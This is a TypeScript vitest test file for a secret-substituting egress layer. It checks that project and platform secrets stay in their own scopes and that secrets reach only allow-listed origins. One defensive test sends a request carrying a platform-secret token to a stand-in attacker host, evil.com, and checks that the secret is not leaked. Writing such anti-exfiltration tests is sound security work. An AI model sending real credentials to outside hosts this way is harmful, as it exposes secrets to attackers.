import { describe, expect, test, vi } from "vitest";
import {
  controlPlaneEgress,
  projectEgress,
  projectSecrets,
  substituteHeaderSecrets,
  type PlatformSecret,
  type SecretsKV,
} from "./egress.ts";

function mockKV(): SecretsKV {
  const m = new Map<string, string>();
  return { get: async (k) => m.get(k) ?? null, put: async (k, v) => void m.set(k, v) };
}

// Capture what fetch() would send, without hitting the network.
function captureFetch() {
  const calls: { url: string; headers: Record<string, string> }[] = [];
  const fn = vi.fn(async (req: Request) => {
    calls.push({
      url: req.url,
      headers: Object.fromEntries([...req.headers]),
    });
    return new Response("ok");
  });
  vi.stubGlobal("fetch", fn);
  return calls;
}

const req = (url: string, headers: Record<string, string>) => new Request(url, { headers });

describe("substituteHeaderSecrets", () => {
  test("only substitutes tokens whose scope this door owns", async () => {
    const r = req("https://x.com/", {
      a: "Bearer {{secret:project:k}}",
      b: "Bearer {{secret:platform:p}}",
    });
    const out = await substituteHeaderSecrets(r, new Set(["project"]), async (_s, n) =>
      n === "k" ? "PROJVAL" : null,
    );
    expect(out.headers.get("a")).toBe("Bearer PROJVAL");
    expect(out.headers.get("b")).toBe("Bearer {{secret:platform:p}}"); // left for the next door
  });

  test("unresolved tokens are left intact", async () => {
    const r = req("https://x.com/", { a: "{{secret:project:missing}}" });
    const out = await substituteHeaderSecrets(r, new Set(["project"]), async () => null);
    expect(out.headers.get("a")).toBe("{{secret:project:missing}}");
  });

  test("multiple tokens in one header value all substitute", async () => {
    const r = req("https://x.com/", { a: "{{secret:project:x}}-{{secret:project:y}}" });
    const out = await substituteHeaderSecrets(r, new Set(["project"]), async (_s, n) =>
      n === "x" ? "AA" : "BB",
    );
    expect(out.headers.get("a")).toBe("AA-BB");
  });
});

describe("controlPlaneEgress — platform secrets: origin-pinned + metered", () => {
  const platform: PlatformSecret[] = [
    { name: "echo", value: "PLATFORM-KEY", allowedOrigins: ["https://allowed.com"] },
  ];

  test("substitutes for an allow-listed origin and meters", async () => {
    const calls = captureFetch();
    const meter = vi.fn();
    await controlPlaneEgress(
      req("https://allowed.com/x", { authorization: "Bearer {{secret:platform:echo}}" }),
      platform,
      meter,
    );
    expect(calls[0].headers.authorization).toBe("Bearer PLATFORM-KEY");
    expect(meter).toHaveBeenCalledWith("echo");
    vi.unstubAllGlobals();
  });

  test("does NOT substitute for a non-allow-listed origin (anti-exfiltration) and does not meter", async () => {
    const calls = captureFetch();
    const meter = vi.fn();
    await controlPlaneEgress(
      req("https://evil.com/x", { authorization: "Bearer {{secret:platform:echo}}" }),
      platform,
      meter,
    );
    expect(calls[0].headers.authorization).toBe("Bearer {{secret:platform:echo}}"); // NOT leaked
    expect(meter).not.toHaveBeenCalled();
    vi.unstubAllGlobals();
  });
});

describe("projectEgress — the two-level chain", () => {
  test("project door substitutes project secrets, CP door substitutes platform secrets", async () => {
    const calls = captureFetch();
    const kv = mockKV();
    const proj = projectSecrets(kv, "proj1");
    await proj.set("mykey", "PROJVAL");
    const platform: PlatformSecret[] = [
      { name: "echo", value: "PLATVAL", allowedOrigins: ["https://allowed.com"] },
    ];
    await projectEgress(
      req("https://allowed.com/x", {
        "x-project": "{{secret:project:mykey}}",
        "x-platform": "Bearer {{secret:platform:echo}}",
      }),
      proj,
      platform,
    );
    expect(calls[0].headers["x-project"]).toBe("PROJVAL");
    expect(calls[0].headers["x-platform"]).toBe("Bearer PLATVAL");
    vi.unstubAllGlobals();
  });

  test("a project secret can never resolve a platform token (scope isolation)", async () => {
    const calls = captureFetch();
    const proj = projectSecrets(mockKV(), "proj1");
    await proj.set("echo", "PROJVAL"); // same NAME as a platform secret, but project scope
    await projectEgress(
      req("https://allowed.com/x", { a: "{{secret:platform:echo}}" }),
      proj,
      [], // no platform secrets configured (generic control plane)
    );
    expect(calls[0].headers.a).toBe("{{secret:platform:echo}}"); // NOT resolved by the project store
    vi.unstubAllGlobals();
  });
});
